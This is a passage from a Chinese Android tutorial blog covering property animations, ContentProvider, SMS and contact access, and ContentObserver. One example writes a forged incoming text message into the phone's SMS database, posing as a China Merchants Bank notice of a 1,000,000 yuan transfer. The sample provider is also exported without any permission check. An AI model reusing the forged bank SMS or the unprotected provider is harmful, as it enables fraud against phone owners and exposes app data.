<li><p>透明度，0是完全透明，1是完全不透明</p>
<pre><code>ObjectAnimator oa = ObjectAnimator.ofFloat(bt, &quot;alpha&quot;, 0.1f, 1);
</code></pre></li>
<li><p>透明示例</p>
<pre><code>//Activity点击事件：透明属性动画
public void alpha(View v){
    ObjectAnimator oa = ObjectAnimator.ofFloat(iv, &quot;alpha&quot;, 0, 0.8f, 0.2f, 1);
    oa.setDuration(2000);
    oa.start();
}
</code></pre><p>###旋转</p>
</li>
<li>Rotation：以组件中心为旋转点旋转</li>
<li>RotationX：以x轴为轴心翻转</li>
<li><p>RotationY：以Y轴为轴心翻转</p>
</li>
<li><p>rotation指定是顺时针旋转</p>
</li>
<li>20是起始角度</li>
<li><p>270是结束角度</p>
<pre><code>ObjectAnimator oa = ObjectAnimator.ofFloat(bt, &quot;rotation&quot;, 20, 270);
</code></pre></li>
<li>属性指定为rotationX是竖直翻转</li>
<li><p>属性指定为rotationY是水平翻转</p>
<pre><code>ObjectAnimator oa = ObjectAnimator.ofFloat(bt, &quot;rotationY&quot;, 20, 180);
</code></pre></li>
<li><p>旋转示例</p>
<pre><code>//Activity点击事件：旋转属性动画
public void rotate(View v){
    ObjectAnimator oa = ObjectAnimator.ofFloat(iv, &quot;rotation&quot;, 0, 180, 90, 270);
    //ObjectAnimator oa = ObjectAnimator.ofFloat(iv, &quot;rotationX&quot;, 0, 180, 90, 360);
    //ObjectAnimator oa = ObjectAnimator.ofFloat(iv, &quot;rotationY&quot;, 0, 180, 90, 360);
    oa.setDuration(2000);
    oa.start();
}
</code></pre></li>
</ul>
<p>###可变参数</p>
<ul>
<li><p>第三个参数可变参数可以传入多个参数，可以实现往回位移（旋转、缩放、透明）</p>
<pre><code>ObjectAnimator oa = ObjectAnimator.ofFloat(bt, &quot;translationX&quot;, 0, 70, 30, 100) ;
</code></pre></li>
</ul>
<p>###所有动画一起飞</p>
<pre><code>//创建动画师集合
AnimatorSet set = new AnimatorSet();
//设置要播放动画的组件//设置改变哪个对象的属性
set.setTarget(iv);
//设置所有动画有先后顺序的播放
//set.playSequentially(oa, oa2, oa3, oa4);
//设置所有动画一起播放
set.playTogether(oa, oa2, oa3, oa4);

//开始动画播放
set.start();
</code></pre><ul>
<li><p>一起飞示例</p>
<pre><code>//Activity点击事件：属性动画一起飞
public void fly(View v){
    //创建动画师集合
    AnimatorSet as = new AnimatorSet();

    //(设置要播放动画的组件)设置改变哪个对象的属性
    as.setTarget(iv);

    //设置组件要播放什么动画
    ObjectAnimator oa1 = ObjectAnimator.ofFloat(iv, &quot;translationX&quot;, 0, 50, -50, 100);
    oa1.setDuration(2000);
    oa1.setRepeatCount(1);
    oa1.setRepeatMode(ObjectAnimator.REVERSE);

    ObjectAnimator oa2 = ObjectAnimator.ofFloat(iv, &quot;scaleX&quot;, 0.5f, 1, 0.3f, 2);
    oa2.setDuration(2000);
    oa2.setRepeatCount(1);

    ObjectAnimator oa3 = ObjectAnimator.ofFloat(iv, &quot;alpha&quot;, 0, 0.8f, 0.2f, 1);
    oa3.setDuration(2000);
    oa3.setRepeatCount(1);
    oa3.setRepeatMode(ObjectAnimator.RESTART);

    ObjectAnimator oa4 = ObjectAnimator.ofFloat(iv, &quot;rotation&quot;, 0, 180, 90, 270);
    oa4.setDuration(2000);
    oa4.setRepeatCount(1);
    oa4.setDuration(2000);

    //把要播放的动画对象添加至此方法中，然后所有动画会顺序播放
    //as.playSequentially(oa1, oa2, oa3, oa4);
    //所有动画一起播放
    as.playTogether(oa1, oa2, oa3, oa4);
    //开始动画播放
    as.start();
}
</code></pre></li>
</ul>
<p>###可以使用xml文件定义</p>
<ul>
<li>1 在animator文件夹下定义.xml文件<blockquote>
<p>/res/animator/objectanimator.xml    </p>
</blockquote>
</li>
<li><p>根节点为objectAnimator</p>
<p> &lt;?xml version=”1.0” encoding=”utf-8”?&gt;</p>
 <objectanimator xmlns:android="http://schemas.android.com/apk/res/android" android:propertyname="translationY" android:duration="2000" android:valuefrom="0" android:valueto="100" android:repeatcount="1" android:repeatmode="reverse"><br> </objectanimator>
</li>
<li><p>2 Activity界面点击按钮 实现xml中的动画效果</p>
<pre><code>public void xml(View v){
    //加载xml属性动画文件
    Animator at = AnimatorInflater.loadAnimator(this, R.animator.objectanimator);
    at.setTarget(iv);
    at.start();
}
</code></pre></li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/02/13/10-内容提供者ContentProvider/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="yass">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="http://ojupj7fr2.bkt.clouddn.com/blog_xintouxiang.png">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="个人博客">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="个人博客" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/02/13/10-内容提供者ContentProvider/" itemprop="url">
                  10 内容提供者ContentProvider
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-13T09:46:09+08:00">
                2017-02-13
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>#一、内容提供者ContentProvider</p>
<p>###1.1 概念</p>
<ul>
<li>应用的数据库是不允许其他应用访问的，数据库文件 一般是私有的。 -rw-rw- — 别的应用程序是没办法访问私有的数据库。</li>
<li>数据库文件私有的目的： 保证应用程序数据的安全。每个应用程序都是独立的，不可以操作另外一个应用程序数据库的数据。</li>
<li>有一些特殊的需求，需要把自己私有的数据库暴露给别的应用程序让别的应用程序访问。</li>
<li><p>内容提供者就是做这个事情的。</p>
<ul>
<li>内容提供者的作用就是让别的应用访问到你的私有数据<br>###1.2 自定义内容提供者</li>
</ul>
</li>
<li><p>步骤1.自定义java类，继承ContentProvider类，重写增删改查方法，在方法中写增删改查数据库的代码(重写增删改查方法分为两小步，1获取操作数据库的db对象，2利用db对象去重写增删改查方法),举例增方法<br>public class PeopleProvider extends ContentProvider {</p>
<pre><code>    private MyOpenHelper oh;//数据库创建的帮助类
    private SQLiteDatabase db;//定义数据库实例对象，这两行代码实际完成一个功能，就是获取操作数据库的db对象

    //用于区分同一数据库下，不同表的操作
    UriMatcher um = new UriMatcher(UriMatcher.NO_MATCH);
    {
        //arg0：主机名，必须与内容提供者主机名一致
        //arg1:路径，随便写，但一般与表名相同，路径中可以携带数据
        um.addURI(&quot;com.itheima.people&quot;, &quot;person&quot;, 1);//content://com.itheima.people/person
        um.addURI(&quot;com.itheima.people&quot;, &quot;handsome&quot;, 2);//content://com.itheima.people/handsome
        um.addURI(&quot;com.itheima.people&quot;, null, 3);//content://com.itheima.people
        um.addURI(&quot;com.itheima.people&quot;, &quot;person/#&quot;, 4);//content://com.itheima.people/person/2
    }
    //内容提供者创建时此方法执行（写死了此内容提供者的数据库）
    @Override
    public boolean onCreate() {
        //获取操作数据库的db对象
        oh = new MyOpenHelper(getContext());
        db = oh.getWritableDatabase();
        return false;
    }

    //根据Uri的不同，操作不同的表
    //此方法是由其他应用调用的，所以插入什么数据由其他应用决定
    @Override
    public Uri insert(Uri uri, ContentValues values) {
        if(um.match(uri) == 1){//判断操作数据库中的那张表
            long id = db.insert(&quot;person&quot;, null, values);
        }
        else if(um.match(uri) == 2){//判断操作数据库中的那张表
            long id = db.insert(&quot;handsome&quot;, null, values);
        }
        else{
            throw new IllegalArgumentException(&quot;别tm瞎传uri&quot;);
        }
        return uri;
    }
}
</code></pre></li>
<li><p>步骤2.在清单文件中定义内容提供者的标签，配置包括：内容提供者provider。配置完整类路径name，主机名authorities。注意必须要有authorities属性，这是内容提供者的主机名，功能类似地址，</p>
<pre><code>&lt;provider android:name=&quot;com.itheima.contentprovider.PersonProvider&quot;
    android:authorities=&quot;com.itheima.people&quot;
    android:exported=&quot;true&quot;
 &gt;&lt;/provider&gt;
</code></pre></li>
</ul>
<p>###1.3如何在其它应用使用内容提供者查询数据</p>
<ul>
<li>创建一个其他应用，访问自定义的内容提供者，实现对数据库的插入操作</li>
</ul>
<p>public void click(View v){<br>            //得到内容分解器对象（获取内容提供者的解析器）<br>            ContentResolver cr = getContentResolver();<br>            //封装要插入的数据<br>            ContentValues cv = new ContentValues();<br>            cv.put(“name”, “小方”);<br>            cv.put(“phone”, 138856);<br>            cv.put(“money”, 3000);<br>            //通过内容提供者的解析器，实现对数据库的插入操作<br>            //arg0:用来匹配内容提供者主机名的Uri<br>            //arg1:要插入的数据<br>            //(每个应用的内容提供者内部已经通过Uri对自己应用数据库进行UriMatcher操作，只需要其它应用通过解析器匹配具体内容提供者的主机名就能调用方法完成对数据库的操作)，url:内容提供者的主机名，要加前缀content://<br>            cr.insert(Uri.parse(“content://com.itheima.person”), cv);<br>        }</p>
<p>–示例–</p>
<p>public class MainActivity extends Activity {</p>
<pre><code>    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    //通过内容提供者，在其应用数据库插入数据
    public void insert(View v){
        //通过内容提供者的解析器，向01数据库插入数据
        ContentResolver cr = getContentResolver() ;
        ContentValues values = new ContentValues();
        values.put(&quot;name&quot;, &quot;巫师2&quot;);
        //values.put(&quot;money&quot;, &quot;12306&quot;);//handsome表没有money字段值，写上报错
        cr.insert(Uri.parse(&quot;content://com.itheima.people/handsome&quot;), values);

        values.clear();
        values.put(&quot;name&quot;, &quot;小黑2&quot;);
        values.put(&quot;money&quot;, &quot;1000000&quot;);
        cr.insert(Uri.parse(&quot;content://com.itheima.people/person&quot;), values);
    }

    //通过内容提供者，在其应用数据库删除数据
    public void delete(View v){
        //通过内容提供者的解析器，向01数据库删除数据
        ContentResolver cr = getContentResolver() ;

        int i = cr.delete(Uri.parse(&quot;content://com.itheima.people/person&quot;), &quot;name=?&quot;, new String[]{&quot;猴子&quot;});
        System.out.println(i);

    }
    //通过内容提供者，在其应用数据库更新数据
    public void update(View v){
        //通过内容提供者的解析器，向01数据库更新数据
        ContentResolver cr = getContentResolver() ;
        ContentValues values = new  ContentValues();
        values.put(&quot;name&quot;, &quot;混沌骑士&quot;);

        int i =cr.update(Uri.parse(&quot;content://com.itheima.people/person&quot;), values, &quot;name=?&quot;, new String[]{&quot;恩赐&quot;});
        System.out.println(i);
    }
    //通过内容提供者，在其应用数据库查询数据
    public void query(View v){
        //通过内容提供者的解析器，向01数据库查询数据
        ContentResolver cr = getContentResolver() ;
        Cursor cursor = cr.query(Uri.parse(&quot;content://com.itheima.people/person&quot;), null, null, null, null);

        while(cursor.moveToNext()){
            String id = cursor.getString(0);//一条记录的id字段值
            String name = cursor.getString(1);//一条记录的名字字段值
            String money = cursor.getString(cursor.getColumnIndex(&quot;money&quot;));//一条记录的money字段值
            System.out.println(id+&quot;;&quot;+name+&quot;;&quot;+money);
        }
    }

    //通过内容提供者，在其应用数据库根据id查询单条记录
    public void queryid(View v){
        //通过内容提供者的解析器，向01数据库查询数据
        ContentResolver cr = getContentResolver() ;

        Cursor cursor = cr.query(Uri.parse(&quot;content://com.itheima.people/person&quot;), null, &quot;_id=?&quot;, new String[]{&quot;3&quot;}, null);
        while(cursor.moveToNext()){
            String id = cursor.getString(0);//一条记录的id字段值
            String name = cursor.getString(1);//一条记录的名字字段值
            String money = cursor.getString(cursor.getColumnIndex(&quot;money&quot;));//一条记录的money字段值
            System.out.println(id+&quot;;&quot;+name+&quot;;&quot;+money);
        }
    }
}
</code></pre><p>###1.4 UriMatcher</p>
<ul>
<li>UriMatcher作用：用于判断一条uri跟指定的多条uri中的哪条匹配（用于匹配数据库中的不同数据表，对匹配到的表进行操作）<br>#####实现UriMatcher步骤</li>
<li>1.在内容提供者类中，创建UriMatcher对象，添加匹配规则</li>
</ul>
<p>//指定多条uri<br>        um.addURI(“com.itheima.person”, “person”, PERSON_CODE);<br>        um.addURI(“com.itheima.person”, “company”, COMPANY_CODE);<br>        //#号可以代表任意数字<br>        um.addURI(“com.itheima.person”, “person/#”, QUERY_ONE_PERSON_CODE);</p>
<p>–示例–</p>
<pre><code>UriMatcher um = new UriMatcher(UriMatcher.NO_MATCH);
{
    //arg0：主机名，必须与内容提供者主机名一致
    //arg1:路径，随便写，但一般与表名相同，路径中可以携带数据
    //arg2:若匹配怎返回该值
    um.addURI(&quot;com.itheima.people&quot;, &quot;person&quot;, 1);//content://com.itheima.people/person
    um.addURI(&quot;com.itheima.people&quot;, &quot;handsome&quot;, 2);//content://com.itheima.people/handsome
    um.addURI(&quot;com.itheima.people&quot;, null, 3);//content://com.itheima.people
    um.addURI(&quot;com.itheima.people&quot;, &quot;person/#&quot;, 4);//content://com.itheima.people/person/2
}
</code></pre><ul>
<li>2.在内容提供者类中，根据传入的uri,通过Uri匹配器可以实现操作不同的表</li>
</ul>
<p>@Override<br>        public Uri insert(Uri uri, ContentValues values) {<br>            if(um.match(uri) == PERSON_CODE){<br>                db.insert(“person”, null, values);<br>            }<br>            else if(um.match(uri) == COMPANY_CODE){<br>                db.insert(“company”, null, values);<br>            }<br>            else{<br>                throw new IllegalArgumentException();<br>            }<br>            return uri;<br>        }</p>
<p>–示例–</p>
<pre><code>//接UriMatcher，根据传入的uri判断将对那张表进行操作，此插入方法是由其他应用调用的，所以插入什么数据由其他应用决定，
@Override
public Uri insert(Uri uri, ContentValues values) {
    if(um.match(uri) == 1){
        long id = db.insert(&quot;person&quot;, null, values);
    }
    else if(um.match(uri) == 2){
        long id = db.insert(&quot;handsome&quot;, null, values);
    }
    else{
        throw new IllegalArgumentException(&quot;别tm瞎传uri&quot;);
    }
    return uri;
}
</code></pre><ul>
<li>3.另外：路径中可以携带数据，如果路径中带有数字，把数字提取出来的api</li>
</ul>
<p>  int id = (int) ContentUris.parseId(uri);</p>
<p>–示例–</p>
<p>  @Override<br>        public Cursor query(Uri uri, String[] projection, String selection,<br>                String[] selectionArgs, String sortOrder) {<br>            Cursor cursor = null;<br>            if(um.match(uri) == 1){<br>                cursor = db.query(“person”, projection, selection, selectionArgs, null, null, sortOrder, null);<br>            }<br>            else if(um.match(uri) == 2){<br>                cursor = db.query(“handsome”, projection, selection, selectionArgs, null, null, sortOrder, null);<br>            }<br>            else if(um.match(uri) == 4){<br>                //把路径中携带的数字取出来<br>                long id = ContentUris.parseId(uri);<br>                cursor = db.query(“person”, projection, “_id = ?”, new String[]{id + “”}, null, null, sortOrder, null);<br>            }<br>            return cursor;<br>        }</p>
<hr>
<p>###1.5读取系统短信数据库</p>
<ul>
<li><p>只需要关注sms表    </p>
<ul>
<li><p>通过阅读源码 短信的内容提供者</p>
<pre><code>android:authorities=&quot;sms&quot;`
</code></pre></li>
<li><p>content://sms/ 这个就是短信内容提供者的路径 </p>
</li>
</ul>
</li>
<li>只需要关注4个字段<ul>
<li>body：短信内容</li>
<li>address:短信的发件人或收件人号码（跟你聊天那哥们的号码）</li>
<li>date：短信时间</li>
<li>type：1为收到，2为发送</li>
</ul>
</li>
<li>读取系统短信，首先查询源码获得短信数据库内容提供者的主机名和路径，然后</li>
</ul>
<p>   //获取内容提供者的解析器<br>        ContentResolver cr = getContentResolver();<br>        //查询获取每个记录有指定字段值的所有记录<br>        Cursor c = cr.query(Uri.parse(“content://sms”), new String[]{“body”, “date”, “address”, “type”}, null, null, null);<br>        //遍历每条记录<br>        while(c.moveToNext()){<br>            //获取每条记录的指定字段值<br>            String body = c.getString(0);<br>            String date = c.getString(1);<br>            String address = c.getString(2);<br>            String type = c.getString(3);<br>            System.out.println(body+”;” + date + “;” + address + “;” + type);<br>        }</p>
<ul>
<li><p>读取系统短信、备份短信需要权限</p>
<pre><code>&lt;uses-permission android:name=&quot;android.permission.READ_SMS&quot;/&gt;
&lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt;
</code></pre></li>
</ul>
<p>–Activity界面读取短信到控制台，短信备份到xml文件示例</p>
<pre><code>//创建存放短信对象的集合
List&lt;Sms&gt; smsList = new ArrayList&lt;Sms&gt;();

//读取系统短信，封装到短信对象
public void click1(View v){
    //通过内容提供者获取系统短信，封装到短信对象中
    ContentResolver cr = getContentResolver();
    Cursor cursor = cr.query(Uri.parse(&quot;content://sms&quot;), new String[]{&quot;body&quot;, &quot;date&quot;, &quot;type&quot;, &quot;address&quot;}, null, null, null);
    while(cursor.moveToNext()){
        String body = cursor.getString(0);
        long date = cursor.getLong(1);
        int type = cursor.getInt(2);
        String address = cursor.getString(3);
        Sms sms = new Sms(body, type, date, address);
        smsList.add(sms);
    }
}
//短信备份到xml文件（要先执行click1）
public void click2(View v){
    XmlSerializer xs = Xml.newSerializer();
    File file = new File(&quot;sdcard/sms.xml&quot;);
    FileOutputStream fos;
    try {
        fos = new FileOutputStream(file);
        xs.setOutput(fos, &quot;utf-8&quot;);

        xs.startDocument(&quot;utf-8&quot;, true);

        xs.startTag(null, &quot;smss&quot;);
        for (Sms sms : smsList) {
            xs.startTag(null, &quot;sms&quot;);

            xs.startTag(null, &quot;body&quot;);
            xs.text(sms.getBody());
            xs.endTag(null, &quot;body&quot;);

            xs.startTag(null, &quot;date&quot;);
            xs.text(sms.getDate() + &quot;&quot;);
            xs.endTag(null, &quot;date&quot;);

            xs.startTag(null, &quot;type&quot;);
            xs.text(sms.getType() + &quot;&quot;);
            xs.endTag(null, &quot;type&quot;);

            xs.startTag(null, &quot;address&quot;);
            xs.text(sms.getAddresss());
            xs.endTag(null, &quot;address&quot;);

            xs.endTag(null, &quot;sms&quot;);
        }
        xs.endTag(null, &quot;smss&quot;);

        xs.endDocument();
    } catch (Exception e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }
}
</code></pre><p>####1.5.1插入系统短信</p>
<pre><code>ContentResolver cr = getContentResolver();
ContentValues cv = new ContentValues();
cv.put(&quot;body&quot;, &quot;您尾号为XXXX的招行储蓄卡收到转账1,000,000人民币&quot;);
cv.put(&quot;address&quot;, 95555);
//1为收到短信，2为发出短信
cv.put(&quot;type&quot;, 1);
cv.put(&quot;date&quot;, System.currentTimeMillis());
cr.insert(Uri.parse(&quot;content://sms&quot;), cv);
</code></pre><ul>
<li><p>插入查询系统短信需要注册权限</p>
<pre><code>&lt;uses-permission android:name=&quot;android.permission.READ_SMS&quot; /&gt;
&lt;uses-permission android:name=&quot;android.permission.WRITE_SMS&quot;/&gt;
</code></pre></li>
</ul>
<p>–插入系统短信示例–</p>
<pre><code>public void click(View v){
    Thread t = new Thread(){
        @Override
        public void run() {
            try {
                //7.5秒后插入短信
                sleep(7500);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            //通过内容提供者把短信插入短信数据库中
            ContentResolver cr = getContentResolver();
            ContentValues values = new ContentValues();
            values.put(&quot;address&quot;, &quot;95555&quot;);
            values.put(&quot;body&quot;, &quot;您尾号为XXXX招行储蓄卡收到转账1,000,000元人民币&quot;);
            values.put(&quot;date&quot;, System.currentTimeMillis());
            values.put(&quot;type&quot;, 1);
            cr.insert(Uri.parse(&quot;content://sms&quot;), values);
        }
    };
    t.start();
}
</code></pre><hr>
<p>###1.6 联系人的内容提供者</p>
<p>####1.6.1 联系人数据库最重要三张表</p>
<ul>
<li>raw_contacts 表  <strong>保存联系人的id</strong></li>
<li>data         表  <strong>保存联系人的数据</strong></li>
<li>mimetypes    表  <strong>保存数据的类型</strong></li>
</ul>
<ul>
<li>raw_contacts表：<ul>
<li>contact_id：联系人id</li>
</ul>
</li>
<li>data表：联系人的具体信息，一个信息占一行<ul>
<li>data1：信息的具体内容</li>
<li>raw_contact_id：联系人id，描述信息属于哪个联系人</li>
<li>mimetype_id：描述信息是属于什么类型</li>
</ul>
</li>
<li>mimetypes表：通过mimetype_id到该表查看具体类型</li>
</ul>
<p>####1.6.2 如何查询联系人的数据库</p>
<ol>
<li>查询raw_contacts 把 联系人的 id获取出来</li>
<li>根据id 查询data表 把这个联系人的数据取出来</li>
<li>根据mimetypes表定义的数据类型 知道这个数据是电话 邮箱 姓名。</li>
</ol>
<p>####1.6.3 联系人删除的时候重要结论<br>删除联系人并不是把联系人的数据全部清空，<br>只是把联系人的contact_id给设置为null。<br>联系人真正的数据并没有被清除还是保留在数据库里的。</p>
<p>设计的目的： 为了方便云同步。</p>
<p>####1.6.3 读取联系人</p>
<ul>
<li><p>先查询raw_contacts表拿到联系人id</p>
<pre><code>Cursor cursor = cr.query(Uri.parse(&quot;content://com.android.contacts/raw_contacts&quot;), new String[]{&quot;contact_id&quot;}, null, null, null);
</code></pre></li>
<li><p>然后拿着联系人id去data表查询属于该联系人的信息</p>
<pre><code>Cursor c = cr.query(Uri.parse(&quot;content://com.android.contacts/data&quot;), new String[]{&quot;data1&quot;, &quot;mimetype&quot;}, &quot;raw_contact_id = ?&quot;, new String[]{contact_id}, null);
</code></pre></li>
<li><p>得到data1字段的值，就是联系人的信息，通过mimetype判断是什么类型的信息</p>
<pre><code>while(c.moveToNext()){
    String data1 = c.getString(0);
    String mimetype = c.getString(1);
    if(&quot;vnd.android.cursor.item/email_v2&quot;.equals(mimetype)){
        contact.setEmail(data1);
    }
    else if(&quot;vnd.android.cursor.item/name&quot;.equals(mimetype)){
        contact.setName(data1);
    }
    else if(&quot;vnd.android.cursor.item/phone_v2&quot;.equals(mimetype)){
        contact.setPhone(data1);
    }
}
</code></pre></li>
<li><p>添加权限</p>
<pre><code>&lt;uses-permission android:name=&quot;android.permission.READ_CONTACTS&quot;/&gt;
</code></pre><p>–读取联系人示例</p>
<pre><code>public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    public void click(View v){
        //获取内容提供者的解析器
        ContentResolver cr = getContentResolver();
        //查询raw_contacts表，获取contact_id字段的记录(所有记录)
        Cursor cursor = cr.query(Uri.parse(&quot;content://com.android.contacts/raw_contacts&quot;), new String[]{&quot;contact_id&quot;}, null, null, null);
        //遍历每条记录
        while(cursor.moveToNext()){
            //得到每条记录中字段为contact_id的值(另外：在查询数据库表时，查询了多个字段，那么角标依次向后排，可获取一条记录中其他字段值)
            String contact_id = cursor.getString(0);
            //根据获取到的contact_id作为查询data表的条件，获取指定字段值的所有记录
            Cursor cursorData = cr.query(Uri.parse(&quot;content://com.android.contacts/data&quot;), new String[]{&quot;data1&quot;, &quot;mimetype&quot;}, 
                    &quot;raw_contact_id = ?&quot;, new String[]{contact_id}, null);

            //创建联系人对象，有name，phone，email 3个成员变量
            Contact contact = new Contact();

            //遍历从data表获取的所有符合条件的记录，从cursor中取出该联系人的信息
            while(cursorData.moveToNext()){
                //获取同一raw_contact_id下的每条记录字段data1和mimetype的值
                String data1 = cursorData.getString(0);
                String mimetype = cursorData.getString(1);

                //根据mimetype值不同，将同在一条记录中的data1的字段值封装到联系人对象中。
                if(&quot;vnd.android.cursor.item/name&quot;.equals(mimetype)){
                    contact.setName(data1);
                }
                else if(&quot;vnd.android.cursor.item/phone_v2&quot;.equals(mimetype)){
                    contact.setPhone(data1);
                }
                else if(&quot;vnd.android.cursor.item/email_v2&quot;.equals(mimetype)){
                    contact.setEmail(data1);
                }
            }
            System.out.println(contact.toString());
        }
    }
}
</code></pre><p>####1.6.4 插入联系人</p>
</li>
<li>先查询raw_contacts表，确定新的联系人的id应该是多少</li>
<li><p>把确定的联系人id插入raw_contacts表</p>
<pre><code>cv.put(&quot;contact_id&quot;, _id);
cr.insert(Uri.parse(&quot;content://com.android.contacts/raw_contacts&quot;), cv);
</code></pre></li>
<li><p>在data表插入数据</p>
<ul>
<li><p>插3个字段：data1、mimetype、raw_contact_id，对于同一个联系人raw_contact_id是不变的，data1和mimetype是对应改变的，多条记录才能完成对一个联系人的插入</p>
<pre><code>cv = new ContentValues();
cv.put(&quot;data1&quot;, &quot;赵六&quot;);
cv.put(&quot;mimetype&quot;, &quot;vnd.android.cursor.item/name&quot;);
cv.put(&quot;raw_contact_id&quot;, _id);
cr.insert(Uri.parse(&quot;content://com.android.contacts/data&quot;), cv);

cv = new ContentValues();
cv.put(&quot;data1&quot;, &quot;1596874&quot;);
cv.put(&quot;mimetype&quot;, &quot;vnd.android.cursor.item/phone_v2&quot;);
cv.put(&quot;raw_contact_id&quot;, _id);
cr.insert(Uri.parse(&quot;content://com.android.contacts/data&quot;), cv);
</code></pre></li>
</ul>
</li>
<li><p>添加权限</p>
<pre><code>&lt;uses-permission android:name=&quot;android.permission.WRITE_CONTACTS&quot;/&gt;
&lt;uses-permission android:name=&quot;android.permission.READ_CONTACTS&quot;/&gt;
</code></pre></li>
</ul>
<p>–插入联系人示例—-</p>
<pre><code>public void click(View v){
    //获取内容提供者的解析器
    ContentResolver cr = getContentResolver();
    //先查询出raw_contacts表中最新一条数据的主键,然后主键+1,就是新的联系人id
    Cursor cursor = cr.query(Uri.parse(&quot;content://com.android.contacts/raw_contacts&quot;), new String[]{&quot;_id&quot;}, null, null, null);
    //设置主键初始为1
    int contact_id = 1;
    //指针移动至最后一行，若成功返回true
    if(cursor.moveToLast()){
        //获取每条记录中的_id
        int _id = cursor.getInt(0);
        //给conttcact_id重新赋值
        contact_id = ++_id;
    }

    //往raw_contacts表中插入联系人id
    ContentValues values = new ContentValues();
    values.put(&quot;contact_id&quot;, contact_id);
    cr.insert(Uri.parse(&quot;content://com.android.contacts/raw_contacts&quot;), values);

    //往data表中插入联系人信息
    values.clear();
    values.put(&quot;data1&quot;, &quot;包九日的儿子&quot;);
    values.put(&quot;mimetype&quot;, &quot;vnd.android.cursor.item/name&quot;);
    values.put(&quot;raw_contact_id&quot;, contact_id);
    cr.insert(Uri.parse(&quot;content://com.android.contacts/data&quot;), values);

    values.clear();
    values.put(&quot;data1&quot;, &quot;13888888&quot;);
    values.put(&quot;mimetype&quot;, &quot;vnd.android.cursor.item/phone_v2&quot;);
    values.put(&quot;raw_contact_id&quot;, contact_id);
    cr.insert(Uri.parse(&quot;content://com.android.contacts/data&quot;), values);
}
</code></pre><hr>
<p>#二、内容观察者ContentObserver</p>
<p>###(应用:比如数据库发生变化,发出通知,被注册的内容观察者接收并进行处理)</p>
<p>####2.1 概念</p>
<ul>
<li>用来接收内容提供者发出的通知<br>####2.2 内容观察者具体实现</li>
<li>当数据库数据改变时，内容提供者会发出通知，在内容提供者的uri上注册一个内容观察者，就可以收到数据改变的通知</li>
<li>1.定义观察者类</li>
<li><p>2.注册内容观察者（使用内容提供者解析器注册内容观察者）</p>
<pre><code>//Activity一运行就执行此方法
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    //2.注册内容观察者
    ContentResolver cr = getContentResolver();
    //arg0:指定接收哪个内容提供者发出的通知(在内容提供者的uri上注册一个内容观察者)
    //arg1:根据boolean值判断匹配精度，一般写true
    //true:表示只要是以content://sms开头的uri上的数据改变,就能收到通知
    //false：表示必须精确匹配content://sms这个uri才能收到通知，例如content://sms/inbox就收不到了
    //arg2: 传入一个观察者对象   
    cr.registerContentObserver(Uri.parse(&quot;content://sms&quot;), true, new MyObserver(new Handler()));
}

//1.定义观察者类
class MyObserver extends ContentObserver{

    public MyObserver(Handler handler) {
        super(handler);
    }

    //收到通知时此方法调用
    @Override
    public void onChange(boolean selfChange) {
        super.onChange(selfChange);
        System.out.println(&quot;短信数据库改变了&quot;);
    }
}
</code></pre><p>####2.3在内容提供者中发通知的代码</p>
<pre><code>ContentResolver cr = getContext().getContentResolver();
//发出通知，所有注册在这个uri上的内容观察者都可以收到通知
//当数据库数据改变时,发送通知
//arg0:所有注册在这个uri上的内容观察者都能收到此通知
cr.notifyChange(uri, null);
</code></pre></li>
</ul>
<p>–在内容提供者中发通知的代码示例–</p>
<pre><code>//重写内容提供者的增删改方法，并发出通知
//此方法是由其他应用调用的，所以插入什么数据由其他应用决定
@Override
public Uri insert(Uri uri, ContentValues values) {
    if(um.match(uri) == 1){
        long id = db.insert(&quot;person&quot;, null, values);

        //当数据库数据改变时,发送通知
        //arg0:所有注册在这个uri上的内容观察者都能收到此通知
        getContext().getContentResolver().notifyChange(uri, null);
    }
    else if(um.match(uri) == 2){
        long id = db.insert(&quot;handsome&quot;, null, values);

        //当数据库数据改变时,发送通知
        //arg0:所有注册在这个uri上的内容观察者都能收到此通知
        getContext().getContentResolver().notifyChange(uri, null);
    }
    else{
        throw new IllegalArgumentException(&quot;别tm瞎传uri&quot;);
    }
    return uri;
}
</code></pre>
          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/02/13/09-多媒体编程/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="yass">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="http://ojupj7fr2.bkt.clouddn.com/blog_xintouxiang.png">
  </span>

